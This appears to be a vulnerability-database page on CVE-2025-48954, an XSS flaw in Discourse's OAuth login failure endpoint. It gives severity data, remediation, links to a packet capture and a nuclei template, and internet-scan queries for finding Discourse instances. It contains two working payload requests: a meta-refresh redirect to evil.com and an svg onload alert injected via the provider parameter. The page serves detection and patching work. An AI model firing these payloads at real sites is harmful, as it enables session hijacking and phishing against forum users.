---
layout: post
cve_id: CVE-2025-48954
title: Discourse OAuth Social Login - Cross-site Scripting
pcap: true
pcap_path: /pcaps/2025/CVE-2025-48954.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-48954.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ferreiraklet,DhiyaneshDK,pdresearch
severity: high
impact: 'Attackers can inject malicious scripts through the provider parameter in
  OAuth login failures, executing JavaScript in victim browsers and potentially achieving
  session hijacking.

  '
remediation: Update the discourse to version 3.5.0.beta6 or later.
reference:
- https://github.com/discourse/discourse/security/advisories/GHSA-26p5-mjjh-wfcf
- https://nvd.nist.gov/vuln/detail/CVE-2025-48954
classification:
  cve-id: CVE-2025-48954
  cwe-id: CWE-79
  epss-score: 0.15576
  epss-percentile: 0.94464
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
  cvss-score: 8.1
  cpe: cpe:2.3:a:discourse:discourse:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 5
  shodan-query: http.component:"Discourse"
  fofa-query: app="Discourse"
  zoomeye-query: app:"Discourse"
  hunter-query: web.title="Discourse"
tags:
- cve
- cve2025
- discourse
- xss
- oauth
- vuln
---

## üîç Vulnerability Description
Discourse versions prior to 3.5.0.beta6 contain a stored Cross-Site Scripting (XSS) vulnerability in the OAuth/social login functionality. The vulnerability is caused by lack of proper content security policy enforcement when processing social login failures,allowing remote attackers to inject and execute malicious scripts in users' browsers.


## üåê HTTP Request
```nohighlight
GET /auth/failure?provider=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps%3A//evil.com%22%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /auth/failure?provider=<svg/onload=alert('XSS-CVE-2025-48954')> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:105.0) Gecko/20100101 Firefox/105.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

